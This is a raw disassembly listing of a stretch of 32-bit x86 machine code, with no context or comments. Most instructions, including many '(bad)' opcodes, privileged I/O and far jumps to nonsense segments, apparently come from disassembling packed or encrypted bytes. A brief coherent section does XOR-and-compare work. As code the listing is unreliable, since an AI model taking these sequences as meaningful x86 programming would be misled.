  41502f:	fisubr WORD PTR [ebx]
  415031:	jge    0x414ff3
  415033:	pop    es
  415034:	sub    esi,eax
  415036:	aad    0x89
  415038:	aad    0x5
  41503a:	sub    ah,cl
  41503c:	sbb    al,0xf9
  41503e:	(bad)  
  41503f:	loope  0x415045
  415041:	lds    eax,FWORD PTR ds:0x58dfd289
  415047:	push   0x74b70464
  41504c:	push   ds
  41504d:	cmp    eax,0x1ae00043
  415052:	mov    al,ds:0xc7caf7a8
  415057:	jmp    0x415053
  415059:	inc    esp
  41505a:	xchg   DWORD PTR [edx],eax
  41505c:	sub    BYTE PTR [ecx-0x17b3767e],cl
  415062:	add    esi,esp
  415064:	js     0x4150bc
  415066:	cmp    al,0x38
  415068:	sahf   
  415069:	cmp    al,0x6d
  41506b:	mov    BYTE PTR [ebx+0x1a1c1b4],dl
  415071:	push   ds
  415072:	jmp    0x415079
  415074:	jo     0x4150ad
  415076:	sahf   
  415077:	adc    DWORD PTR [ecx-0x7c08fcf2],0xffffffc2
  41507e:	or     al,0xb7
  415080:	xchg   edx,eax
  415081:	shl    BYTE PTR [edx+edi*8+0x5f],cl
  415085:	jg     0x41500a
  415087:	cdq    
  415088:	xor    al,0x18
  41508a:	adc    al,0xf0
  41508c:	mov    bh,0x2
  41508e:	fistp  WORD PTR [eiz*8-0x176b06d0]
  415095:	test   eax,0xa2ef9f59
  41509a:	push   edx
  41509b:	xor    ch,ah
  41509d:	jns    0x415076
  41509f:	sbb    eax,0x94f8d043
  4150a5:	pop    esp
  4150a6:	out    dx,al
  4150a7:	fwait
  4150a8:	daa    
  4150a9:	push   ecx
  4150aa:	in     al,0x7d
  4150ac:	rol    BYTE PTR [ebx-0x1],0x9f
  4150b0:	rcr    DWORD PTR [edi],0x96
  4150b3:	out    0xa7,al
  4150b5:	inc    edi
  4150b6:	shl    DWORD PTR [eax-0x11c712c5],0xa7
  4150bd:	pop    es
  4150be:	mov    ebp,0x91d7a15c
  4150c3:	out    dx,al
  4150c4:	outs   dx,DWORD PTR ds:[esi]
  4150c6:	ror    esp,1
  4150c8:	lods   al,BYTE PTR ds:[esi]
  4150c9:	ret    0x377a
  4150cc:	dec    ebp
  4150cd:	into   
  4150ce:	repnz and eax,0x3751b362
  4150d4:	push   edi
  4150d5:	scas   al,BYTE PTR es:[edi]
  4150d6:	mov    esp,0x47e09beb
  4150db:	mov    ah,0x74
  4150dd:	xchg   DWORD PTR [edx-0x157b6410],esi
  4150e3:	mov    bh,0x2b
  4150e5:	dec    ecx
  4150e6:	fild   QWORD PTR [edi+eiz*4-0x43]
  4150ea:	fdivr  DWORD PTR [esi]
  4150ec:	ret    
  4150ed:	cmp    cl,BYTE PTR [edi]
  4150ef:	test   DWORD PTR [ecx-0x51],0x8b7d851b
  4150f6:	inc    ebx
  4150f7:	mov    esi,0xe0c60d35
  4150fc:	or     al,BYTE PTR [edi+0x685c58f2]
  415102:	and    ecx,DWORD PTR [edi-0x69a58789]
  415108:	xor    DWORD PTR [edi+0x100e164c],esi
  41510e:	jmp    0x440f2e3
  415113:	add    DWORD PTR [esi+0x64bf3c6f],esi
  415119:	mov    eax,ds:0xcac7b36c
  41511e:	cmp    al,0xba
  415120:	mov    WORD PTR [ebp-0x3f641b0b],cs
  415126:	loope  0x4150b6
  415128:	adc    eax,0x549ed4a1
  41512d:	loopne 0x4150f2
  41512f:	out    0xe,al
  415131:	inc    esi
  415132:	ret    
  415133:	ffree  st(5)
  415135:	dec    ebp
  415136:	loope  0x415182
  415138:	rcl    DWORD PTR [edi+0x18],0x31
  41513c:	mov    esp,0xac3fa655
  415141:	mov    es,WORD PTR [edx+0x60]
  415144:	sbb    DWORD PTR [ecx-0xf],0x50
  415148:	cdq    
  415149:	inc    esp
  41514a:	pusha  
  41514b:	dec    eax
  41514c:	imul   BYTE PTR [edx]
  41514e:	push   esp
  41514f:	loop   0x4151a8
  415151:	mov    edi,0x83a0cd8e
  415156:	int    0x20
  415158:	mov    ch,0x3d
  41515a:	mov    dh,0x38
  41515c:	jmp    0xdeaa:0x327af841
  415163:	mov    BYTE PTR [eax],bh
  415165:	stos   BYTE PTR es:[edi],al
  415166:	pusha  
  415167:	dec    eax
  415168:	jo     0x41512d
  41516a:	jl     0x4151e5
  41516c:	push   ebp
  41516d:	rcl    edi,cl
  41516f:	fdiv   DWORD PTR [edx-0x3b]
  415172:	das    
  415173:	loop   0x4151cc
  415175:	xchg   DWORD PTR [edi+eax*4-0x1137021e],esp
  41517c:	nop
  41517d:	into   
  41517e:	or     al,0x2b
  415180:	loopne 0x41510b
  415182:	fmul   QWORD PTR gs:[ebx+0x55b9fc45]
  415189:	or     BYTE PTR [ecx+0x7],dl
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fst    DWORD PTR [ebx-0x124d31a9]
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	(bad)  
  4151b1:	jecxz  0x4151d5
  4151b3:	push   ss
  4151b4:	xchg   ebx,eax
  4151b5:	(bad)  
  4151b6:	aam    0x9e
  4151b8:	aas    
  4151b9:	fmul   QWORD PTR [ecx-0x4d]
  4151bc:	fadd   QWORD PTR [ebx+0x77]
  4151bf:	fwait
  4151c0:	repz sbb ebp,DWORD PTR [edi+0x3d]
  4151c4:	call   0x68ec:0x8815ef67
  4151cb:	fst    QWORD PTR [ebp+0x15]
  4151ce:	xor    al,0x65
  4151d0:	sub    esi,DWORD PTR [ecx+eax*1]
  4151d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151d4:	pop    ds
  4151d5:	pop    ss
  4151d6:	je     0x41520e
  4151d8:	ss push ss
  4151da:	push   eax
  4151db:	loopne 0x41516d
  4151dd:	gs (bad) 
  4151e0:	jg     0x415219
  4151e2:	inc    ecx
  4151e3:	pop    edi
  4151e4:	retf   
  4151e5:	lds    ebp,FWORD PTR [ebp-0x1b]
  4151e8:	cmc    
  4151e9:	addr16 inc edx
  4151eb:	pop    ecx
  4151ec:	push   ebp
  4151ed:	std    
  4151ee:	add    BYTE PTR [edx+eax*1],0xaa
  4151f2:	loop   0x415202
  4151f4:	lods   eax,DWORD PTR ds:[esi]
  4151f5:	loop   0x4151cc
  4151f7:	repz or BYTE PTR [edi+0x39],cl
  4151fb:	jg     0x4151d5
  4151fd:	push   ecx
  4151fe:	inc    ecx
  4151ff:	jmp    0xc24b:0xf5eb3dba
  415206:	sar    bh,1
  415208:	jle    0x415203
  41520a:	sub    eax,DWORD PTR [ebx+0x7356a48]
  415210:	xchg   edi,eax
  415211:	or     eax,0x1b0132cb
  415216:	mov    al,ds:0xfea016a3
  41521b:	and    ebx,DWORD PTR [ecx-0x1c3abd5e]
  415221:	mov    esp,0xe295f49
  415226:	cmp    BYTE PTR [eax+ebp*1-0x7a],ah
  41522a:	pop    esp
  41522b:	enter  0x49f9,0x50
  41522f:	arpl   WORD PTR [ebx-0x7236aed5],sp
  415235:	das    
  415236:	push   eax
  415237:	dec    ebp
  415238:	(bad)  
  415239:	cmc    
  41523a:	(bad)  
  41523b:	pop    esi
  41523c:	fldenv ds:0x70cde30b
  415242:	adc    al,0x75
  415244:	lods   al,BYTE PTR ds:[esi]
  415245:	adc    DWORD PTR [esi+0xe],0x610a60e3
  41524c:	xchg   edi,eax
  41524d:	mov    cl,BYTE PTR [edi-0x174e8ce4]
  415253:	cmp    al,0xf
  415255:	inc    ebx
  415256:	mov    eax,ds:0x524107d5
  41525b:	and    ebx,DWORD PTR [esi+0x63f970c8]
  415261:	add    DWORD PTR [edx-0x71fd2d1c],ecx
  415267:	out    0x55,eax
  415269:	cmp    edi,DWORD PTR [ecx-0x4f]
  41526c:	retf   
  41526d:	inc    ecx
  41526e:	dec    esi
  415270:	js     0x4152db
  415272:	and    eax,0x82a80957
  415277:	sub    BYTE PTR [ecx],dh
  415279:	xchg   esi,edi
  41527b:	addr16 and ch,ah
  41527e:	sub    BYTE PTR [edx*4-0x2f472cf],0x17
  415286:	(bad)  
  415287:	in     eax,0x4f
  415289:	sbb    ebx,DWORD PTR [ecx]
  41528b:	inc    ebx
  41528c:	or     eax,0xf3f4bf6d
  415291:	mov    ebp,0xe99370e7
  415296:	in     eax,0xdc
  415298:	mov    ss,WORD PTR [esi-0x1503d4fb]
  41529e:	je     0x4152e6
  4152a0:	stos   BYTE PTR es:[edi],al
  4152a1:	cmp    eax,edx
  4152a3:	xchg   edi,eax
  4152a4:	neg    esi
  4152a6:	pop    esi
  4152a7:	jl     0x4152d0
  4152a9:	jnp    0x41527a
  4152ab:	mov    ds:0x72a56e4b,eax
  4152b0:	shl    BYTE PTR [ebx],0x8f
  4152b3:	call   0x2b63:0xc8b9ab03
  4152ba:	sbb    DWORD PTR [edx+0x2],esp
  4152bd:	mov    ds:0xe8abb6d8,eax
  4152c2:	xor    DWORD PTR [edx],ebx
  4152c4:	jo     0x415280
  4152c6:	leave  
  4152c7:	paddusb mm4,QWORD PTR [ecx+ebx*1+0x18]
  4152cc:	int3   
  4152cd:	pop    ebp
  4152ce:	adc    DWORD PTR [eax-0x6f],0xffffffad
  4152d2:	sbb    bh,BYTE PTR [edi-0x91535c5]
  4152d8:	enter  0x862d,0x86
  4152dc:	add    eax,0xf01465a0
  4152e1:	xchg   esp,eax
  4152e2:	cdq    
  4152e3:	adc    al,0x25
  4152e5:	scas   al,BYTE PTR es:[edi]
  4152e6:	add    ch,BYTE PTR [ecx-0x40f5648b]
  4152ec:	sub    ebp,DWORD PTR ds:0x8df175af
  4152f2:	je     0x4152d0
  4152f4:	mov    ah,0xeb
  4152f6:	mov    ebp,0x90862f99
  4152fb:	dec    eax
  4152fc:	enter  0xcaae,0xbc
  415300:	adc    dl,ch
  415302:	cmp    DWORD PTR ds:0x3cb225b9,ebx
  415308:	cdq    
  415309:	adc    al,0x4
  41530b:	mov    ebx,0x2d7d0ae8
  415310:	retf   0x9f
  415313:	cli    
  415314:	bound  edx,QWORD PTR ds:0xf2881e91
  41531a:	sub    al,0x2a
  41531c:	aad    0x6e
  41531e:	sti    
  41531f:	inc    edi
  415320:	ss cmp al,0xee
  415323:	jo     0x415353
  415325:	cs call 0x865979cb
  41532b:	sti    
  41532c:	aam    0x7
  41532e:	dec    edx
  41532f:	addr16 je 0x415375
  415332:	add    BYTE PTR [eax+0xd],cl
  415335:	mov    al,ds:0x6978d0e2
  41533a:	jmp    0x7fb3:0xd2222721
  415341:	rol    DWORD PTR [esi+0x5f8a9d07],0x22
  415348:	sub    ecx,ebp
  41534a:	jns    0x41532d
  41534c:	scas   al,BYTE PTR es:[edi]
  41534d:	xor    al,0xf8
  41534f:	sbb    ecx,ebp
  415351:	sbb    ch,dh
  415353:	sbb    DWORD PTR [edi-0x686ae700],esi
  415359:	or     ecx,ecx
  41535b:	or     ah,BYTE PTR [edx+0x237e8f13]
  415361:	fld    TBYTE PTR [ebx+0x16]
  415364:	and    ch,BYTE PTR [esi]
  415366:	hlt    
  415367:	aam    0x7f
  415369:	and    esp,DWORD PTR [ecx+0x68e87ee5]
  41536f:	sbb    ah,bl
  415371:	add    DWORD PTR [edx+0x522341a2],ebp
  415377:	push   ecx
  415378:	hlt    
  415379:	mov    edi,0x74e1ac4b
  41537e:	cmp    esi,ebp
  415380:	icebp  
  415381:	sbb    al,0x60
  415383:	xor    BYTE PTR [ebp-0x2343c47c],cl
  415389:	ret    0x2455
  41538c:	sbb    eax,0xd038ccf1
  415391:	retf   0x233e
  415394:	mov    bh,0x5f
  415396:	loope  0x415405
  415398:	ss mov ah,0x9f
  41539b:	and    bl,bh
  41539d:	add    DWORD PTR [ecx-0x51],0x7102d69e
  4153a4:	test   al,0xcb
  4153a6:	imul   esp,DWORD PTR [eax+0x26],0x22c01ab7
  4153ad:	fisttp QWORD PTR [esi+0x76328fd3]
  4153b3:	jno    0x415405
  4153b5:	and    DWORD PTR [esi+eax*4+0xf1964db],ebp
  4153bc:	cmp    DWORD PTR [edi],0xc03e29ca
  4153c2:	lods   eax,DWORD PTR ds:[esi]
  4153c3:	xchg   DWORD PTR [bx+di+0x70],eax
  4153c7:	lahf   
  4153c8:	in     al,dx
  4153c9:	cmp    bl,BYTE PTR [ebx-0x392f3116]
  4153cf:	out    dx,al
  4153d0:	mov    edx,0x399956e2
  4153d5:	pop    eax
  4153d6:	push   edx
  4153d7:	pop    eax
  4153d8:	outs   dx,DWORD PTR ds:[esi]
  4153d9:	adc    eax,0xa71fe434
  4153de:	jg     0x4153d9
  4153e0:	sar    DWORD PTR [edx],0xc
  4153e3:	int    0xf9
  4153e5:	test   al,0xfc
  4153e7:	push   ebx
  4153e8:	cmp    eax,0x9dc46fa2
  4153ed:	idiv   DWORD PTR [edx+0x45]
  4153f0:	dec    edi
  4153f1:	or     eax,0x4fa046f3
  4153f6:	xor    ch,al
  4153f8:	out    0x87,al
  4153fa:	cdq    
  4153fb:	inc    esp
  4153fc:	cmp    DWORD PTR ds:0x9a6e5a97,0x28
  415403:	(bad)  
  415404:	loop   0x415390
  415406:	or     al,0x46
  415408:	rcr    al,0x22
  41540b:	mov    eax,0xeac891f7
  415410:	lahf   
  415411:	hlt    
  415412:	pop    ebx
  415413:	inc    ebx
  415414:	sub    dl,BYTE PTR [ebx+0x38]
  415417:	cdq    
  415418:	dec    ebp
  415419:	dec    ebx
  41541a:	fstp   TBYTE PTR [ecx+0x6b]
  41541e:	dec    esi
  41541f:	and    al,0x67
  415421:	xchg   ebx,eax
  415422:	sub    edi,DWORD PTR [esp+ebp*8-0x73]
  415426:	aaa    
  415427:	mov    ecx,0xd65f460a
  41542c:	mov    al,ds:0x94f28069
  415431:	stos   BYTE PTR es:[edi],al
  415432:	jmp    0x8f74:0x66f6d5a4
  415439:	jns    0x4153fa
  41543b:	push   ss
  41543c:	jmp    0x415401
  41543e:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415440:	mov    edx,0xb03f0fa0
  415445:	popa   
  415446:	sub    ebp,DWORD PTR [edi]
  415448:	jp     0x4154b8
  41544a:	jno    0x4153d2
  41544c:	and    esi,DWORD PTR [edi+0xc]
  41544f:	xor    al,0x5d
  415451:	sub    al,0x87
  415453:	cmp    BYTE PTR [eax+ebp*2-0xf],cl
  415457:	imul   edi,DWORD PTR [ecx+0x61],0x6f42df07
  41545e:	dec    ebp
  41545f:	push   ecx
  415460:	sahf   
  415461:	mov    eax,0xa05a6a9
  415466:	rol    ch,0xe8
  415469:	std    
  41546a:	push   ds
  41546b:	scas   al,BYTE PTR es:[edi]
  41546c:	inc    ebx
  41546d:	inc    ebp
  41546e:	imul   ebx,edx,0xa9df9340
  415474:	mov    esp,0xc203f31a
  415479:	mov    DWORD PTR [ebp+0x8],eax
  41547c:	mov    eax,DWORD PTR [ebp-0x18]
  41547f:	xor    eax,ecx
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0x9f
  4154c8:	das    
  4154c9:	ret    0x36af
  4154cc:	add    bh,BYTE PTR [edi+0x70]
  4154cf:	mov    ecx,0xdf70707e
  4154d4:	mov    al,ds:0xb77e3dd
  4154d9:	xchg   esp,eax
  4154da:	xchg   esp,eax
  4154db:	dec    eax
  4154dc:	push   eax
  4154dd:	outs   dx,BYTE PTR ds:[esi]
  4154de:	popa   
  4154df:	adc    ah,ch
  4154e1:	add    esi,0x69
  4154e4:	imul   edx,ebx,0x39e65238
  4154ea:	jmp    0x4154eb
  4154ec:	dec    esp
  4154ed:	imul   edi,DWORD PTR [ecx-0x52],0xffffffee
  4154f1:	cmp    ebp,DWORD PTR [ebp+0x721c87b2]
  4154f7:	mov    ebx,0x4628ec36
  4154fc:	and    DWORD PTR [esi],edx
  4154fe:	popa   
  4154ff:	lahf   
  415500:	ins    DWORD PTR es:[edi],dx
  415501:	loop   0x4154c0
  415503:	or     DWORD PTR [ecx],ebp
  415505:	xchg   BYTE PTR [ebx-0x13],dh
  415508:	and    DWORD PTR [ebp+0x60e70bbc],edi
  41550e:	add    bh,ah
  415510:	mov    ebp,0x90e836d2
  415515:	ret    
  415516:	stc    
  415517:	jae    0x415537
  415519:	mov    bl,0x57
  41551b:	fimul  DWORD PTR [ebx-0x1b]
  41551e:	scas   eax,DWORD PTR es:[edi]
  41551f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415520:	xchg   edi,eax
  415521:	mov    esp,0x4379899a
  415526:	ficom  WORD PTR gs:[ecx]
  415529:	cmp    bh,BYTE PTR [esi+0x3dcf4693]
  41552f:	inc    esi
  415530:	sub    ebx,DWORD PTR [eax+0x45]
  415533:	or     al,0x81
  415535:	push   eax
  415536:	xchg   esi,eax
  415537:	mov    bl,0xe8
  415539:	dec    esi
  41553a:	push   ebx
  41553b:	add    al,0xbb
  41553d:	imul   edx,DWORD PTR [ecx],0x42
  415540:	pxor   mm1,mm4
  415543:	mov    ds:0xe1d4ab5c,eax
  415548:	inc    esp
  415549:	xchg   esi,eax
  41554a:	into   
  41554b:	outs   dx,DWORD PTR ds:[esi]
  41554d:	pop    ebp
  41554e:	(bad)  
  41554f:	fidivr DWORD PTR [eax+0x173d2dea]
  415555:	cld    
  415556:	cs (bad) 
  415558:	imul   DWORD PTR [esi]
  41555a:	adc    eax,0x33c46e41
  41555f:	call   0x97cd:0xf28821d4
  415566:	pushf  
  415567:	aam    0xb
  415569:	inc    esi
  41556a:	fdivr  DWORD PTR [ebx+0x7e]
  41556d:	les    edx,FWORD PTR [esi-0x3b]
  415570:	push   ebx
  415571:	je     0x41552f
  415573:	aad    0x29
  415575:	jo     0x415535
  415577:	push   ds
  415578:	ins    BYTE PTR es:[edi],dx
  415579:	les    ecx,FWORD PTR [edx+0x6]
  41557c:	xchg   edi,eax
  41557d:	sar    DWORD PTR [ecx-0x43],cl
  415580:	push   esi
  415581:	cli    
  415582:	int    0x8
  415584:	mov    edx,0x47ed18d6
  415589:	jl     0x4155c8
  41558b:	movsx  ebp,WORD PTR [eax-0x4e092dba]
  415592:	xor    bh,BYTE PTR [ecx]
  415594:	mov    bh,0x37
  415596:	cli    
  415597:	test   eax,0x855d236d
  41559c:	mov    dl,bh
  41559e:	stos   BYTE PTR es:[edi],al
  41559f:	push   esi
  4155a0:	ret    0xd0ad
  4155a3:	aaa    
  4155a4:	stos   DWORD PTR es:[edi],eax
  4155a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155a6:	jbe    0x415573
  4155a8:	ins    BYTE PTR es:[edi],dx
  4155a9:	adc    eax,0x71172d6a
  4155ae:	cmp    DWORD PTR [esi+0x6ea2b2f4],ecx
  4155b4:	inc    esi
  4155b5:	stos   DWORD PTR es:[edi],eax
  4155b6:	mov    dl,0x33
  4155b8:	in     ax,dx
  4155ba:	mov    BYTE PTR [ebx-0x1ad8c6f],ch
  4155c0:	cld    
  4155c1:	(bad)
  4155c4:	pop    ebp
  4155c5:	test   bl,bh
  4155c7:	ror    DWORD PTR [ebx+0x37c311],0xb7
  4155ce:	addr16 jmp 0xa7ef:0x7fa77431
  4155d6:	sub    BYTE PTR ds:[eax-0x5a00d758],al
  4155dd:	dec    edx
  4155de:	pop    eax
  4155df:	jecxz  0x415607
  4155e1:	mov    eax,ds:0x368b21bd
  4155e6:	(bad)  
  4155e7:	mov    ebp,0x1e997f97
  4155ec:	push   esp
  4155ed:	sub    eax,0x32a6601b
  4155f2:	shr    DWORD PTR [edx],1
  4155f4:	aaa    
  4155f5:	mov    ah,0x1b
  4155f7:	jp     0x415608
  4155f9:	std    
  4155fa:	js     0x41558e
  4155fc:	inc    ebp
  4155fd:	leave  
  4155fe:	push   esp
  4155ff:	mov    ch,0xc9
  415601:	fbld   TBYTE PTR [ebx]
  415603:	retf   
  415604:	ss mov bh,0x5d
  415607:	push   0xc8357946
  41560c:	mov    ecx,0xa86f4ffc
  415611:	push   ecx
  415612:	mov    cl,0x50
  415614:	icebp  
  415615:	jmp    0xf9e9:0xbb839011
  41561c:	outs   dx,BYTE PTR ds:[esi]
  41561d:	out    0x5f,al
  41561f:	xchg   edx,eax
  415620:	repnz push ss
  415622:	jmp    0x415682
  415624:	int3   
  415625:	cmp    edi,ecx
  415627:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415628:	stos   DWORD PTR es:[edi],eax
  415629:	dec    ebx
  41562a:	std    
  41562b:	inc    ebx
  41562c:	dec    edx
  41562d:	mov    edi,0x31cc612b
  415632:	cmp    ecx,DWORD PTR [ecx-0x409fa35b]
  415638:	mov    dh,BYTE PTR [ecx]
  41563a:	jae    0x4155d3
  41563c:	jo     0x4155e7
  41563e:	pop    edx
  41563f:	data16 aad 0xee
  415642:	out    0xfd,al
  415644:	cmp    DWORD PTR [ebx-0x15],ecx
  415647:	jnp    0x4156b7
  415649:	jmp    FWORD PTR [edx+edi*1]
  41564c:	in     al,dx
  41564d:	shl    DWORD PTR [edx-0x5e],cl
  415650:	xor    eax,0x71ee8447
  415655:	pop    esi
  415656:	mov    eax,ds:0x1a5ec478
  41565b:	nop
  41565c:	push   eax
  41565d:	pop    es
  41565e:	test   al,0x19
  415660:	into   
  415661:	add    esi,DWORD PTR [eax-0x57]
  415664:	sub    eax,0x8deca80c
  415669:	sbb    BYTE PTR [ebp+0x67],al
  41566c:	xchg   BYTE PTR [edi],bh
  41566e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41566f:	mov    ds:0x438e577,al
  415674:	imul   eax,DWORD PTR [edi+0x3c],0x418fbc9a
  41567b:	mov    esi,0xaf5d9a7e
  415680:	or     edx,ebp
  415682:	stos   DWORD PTR es:[edi],eax
  415683:	fsubr  DWORD PTR [ebp+0x1ee47faa]
  415689:	inc    esi
  41568a:	in     eax,dx
  41568b:	xchg   ebx,eax
  41568c:	je     0x4156f6
  41568e:	mov    cl,0x3
  415690:	mov    ds:0x345c059b,al
  415695:	pop    edx
  415696:	in     al,0xcd
  415698:	push   ecx
  415699:	jnp    0x4156fd
  41569b:	xchg   BYTE PTR [edi],cl
  41569d:	mov    al,ds:0x25506b0d
  4156a2:	adc    ch,dh
  4156a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156a5:	and    al,0xaa
  4156a7:	das    
  4156a8:	fsubrp st(5),st
  4156aa:	jne    0x41571b
  4156ac:	add    DWORD PTR [eax-0x18],edx
  4156af:	mov    eax,0x16bce463
  4156b4:	add    BYTE PTR [eax],0xb7
  4156b7:	cmp    al,BYTE PTR [edi+0x69]
  4156ba:	mov    dh,0xe4
  4156bc:	xor    ecx,ebx
  4156be:	cli    
  4156bf:	mov    bl,BYTE PTR [edx+0x5a8f6f20]
  4156c5:	js     0x41572c
  4156c7:	jne    0x41570a
  4156c9:	xchg   BYTE PTR [ebx],bl
  4156cb:	mov    ch,0x36
  4156cd:	sbb    ebp,ebx
  4156cf:	xchg   BYTE PTR [eax-0x43],dh
  4156d2:	stc    
  4156d3:	mov    cl,BYTE PTR [edi+ebp*4-0x36]
  4156d7:	sub    eax,0xc73a3881
  4156dc:	inc    edi
  4156dd:	mov    eax,0xd89082d2
  4156e2:	inc    ebp
  4156e3:	test   BYTE PTR [ecx+0x7cbd21b],bh
  4156e9:	(bad)  
  4156ea:	pusha  
  4156eb:	mov    ah,0xa6
  4156ed:	(bad)  
  4156ee:	push   ds
  4156ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156f0:	pop    ds
  4156f1:	scas   eax,DWORD PTR es:[edi]
  4156f2:	repz jge 0x415692
  4156f5:	ds lahf 
  4156f7:	mov    eax,ds:0xa4d13b58
  4156fc:	push   eax
  4156fd:	jno    0x41575d
  4156ff:	pop    edx
  415700:	or     eax,0x6cbdce87
  415705:	in     eax,dx
  415706:	mov    DWORD PTR [ebx],ebp
  415708:	loop   0x4156c3
  41570a:	ror    BYTE PTR [esi],1
  41570c:	fild   QWORD PTR [eax]
  41570e:	xor    dh,BYTE PTR [ebx-0x17]
  415711:	js     0x41576e
  415713:	jp     0x415735
  415715:	popf   
  415716:	jge    0x4156a7
  415718:	dec    edi
  415719:	rcr    DWORD PTR [ebx+0x6e8e62f8],0xee
  415720:	jle    0x415726
  415722:	jnp    0x41573c
  415724:	sahf   
  415725:	shr    DWORD PTR [ecx-0x1d],cl
  415728:	das    
  415729:	xor    cl,ah
  41572b:	mov    eax,0xead82288
  415730:	adc    al,0x2b
  415732:	in     al,0x72
  415734:	cs push ebx
  415736:	scas   eax,DWORD PTR es:[edi]
  415737:	je     0x4157b4
  415739:	ins    DWORD PTR es:[edi],dx
  41573a:	cmp    ah,dh
  41573c:	popf   
  41573d:	or     ecx,DWORD PTR [edi-0x67a4f7d9]
  415743:	test   DWORD PTR [esi+0x5c],0xf8cf1f03
  41574a:	mov    eax,ds:0x5eba3eb3
  41574f:	push   esp
  415750:	push   0xffffffc0
  415752:	cmp    al,0xc9
  415754:	scas   al,BYTE PTR es:[edi]
  415755:	lods   al,BYTE PTR ds:[esi]
  415756:	adc    DWORD PTR [edx+0x254b32cf],esp
  41575c:	add    DWORD PTR [edi-0x5c],edx
  41575f:	or     DWORD PTR [edi+0x65140cfd],esi
  415765:	jl     0x415735
  415767:	push   esi
  415768:	adc    bh,bh
  41576a:	loope  0x415772
  41576c:	out    0x97,al
  41576e:	mov    ecx,0x2dd2c21f
  415773:	inc    eax
  415774:	scas   eax,DWORD PTR es:[edi]
  415775:	sub    ebp,esi
  415777:	cs mov bh,0x2f
  41577a:	jg     0x41578e
  41577c:	and    al,0x65
  41577e:	ret    
  41577f:	mov    edx,0x2c87f
  415784:	int    0xe5
  415786:	jp     0x4157df
  415788:	pop    eax
  415789:	and    BYTE PTR [ecx+0xd1e6cb1],bl
  41578f:	les    esi,FWORD PTR ds:0x1b5e610c
  415795:	push   esi
  415796:	jl     0x4157a8
  415798:	add    ebx,DWORD PTR [esi-0x42]
  41579b:	pushf  
  41579c:	jb     0x4157d0
  41579e:	add    BYTE PTR [ebx],al
  4157a0:	(bad)  
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   BYTE PTR [esp+edx*1],cl
  4157b9:	jae    0x415785
  4157bb:	jg     0x4157cc
  4157bd:	jg     0x41582f
  4157bf:	mov    ecx,0xce70707e
  4157c4:	jl     0x41582c
  4157c6:	cmc    
  4157c7:	and    edx,DWORD PTR [esi+0x54]
  4157ca:	jne    0x41574f
  4157cc:	mov    eax,ds:0x87e8ea56
  4157d1:	and    al,0x64
  4157d3:	ret    0x8d3f
  4157d6:	shl    DWORD PTR [eax+ecx*1+0x2b],1
  4157da:	sub    dh,BYTE PTR [ecx-0x31]
  4157dd:	jmp    0x7e10:0xa1900ae3
  4157e4:	fbstp  TBYTE PTR [eax+0x5b]
  4157e7:	das    
  4157e8:	lods   al,BYTE PTR ds:[esi]
  4157e9:	or     edi,DWORD PTR [eax-0x19]
  4157ec:	push   esp
  4157ed:	jns    0x4157cb
  4157ef:	fisubr DWORD PTR [esp+ebp*2-0x8c03037]
  4157f6:	xchg   DWORD PTR [ebx],edx
  4157f8:	xor    cl,BYTE PTR [edi-0x6]
  4157fb:	das    
  4157fc:	mov    ebp,0x1715dd52
  415801:	push   esp
  415802:	stos   BYTE PTR es:[edi],al
  415803:	pop    ds
  415804:	pop    ecx
  415805:	jae    0x4157bf
  415807:	scas   al,BYTE PTR es:[edi]
  415808:	cld    
  415809:	push   edi
  41580a:	adc    eax,DWORD PTR ds:0x9eb57a99
  415810:	ins    DWORD PTR es:[edi],dx
  415811:	or     DWORD PTR [ebx],esp
  415813:	sub    al,0x3f
  415815:	arpl   WORD PTR [edx-0x5398713e],dx
  41581b:	adc    al,0x30
  41581d:	sub    al,0x9d
  41581f:	push   ebp
  415820:	xor    al,0x9e
  415822:	loop   0x41582f
  415824:	shr    DWORD PTR [ebp+0x56],1
  415827:	(bad)  
  415828:	dec    ecx
  415829:	pusha  
  41582a:	inc    eax
  41582b:	retf   
  41582c:	test   dl,cl
  41582e:	dec    esi
  41582f:	add    edx,esi
  415831:	ins    DWORD PTR es:[edi],dx
  415832:	scas   al,BYTE PTR es:[edi]
  415833:	pop    edx
  415834:	es push eax
  415836:	add    BYTE PTR [ebx-0x69cf83ac],ah
  41583c:	jae    0x415829
  41583e:	inc    ebx
  41583f:	ret    0x7d62
  415842:	push   es
  415843:	call   0x2c4e:0x12a26988
  41584a:	xor    ch,BYTE PTR ds:[edx+0x667706ad]
  415851:	xor    bl,al
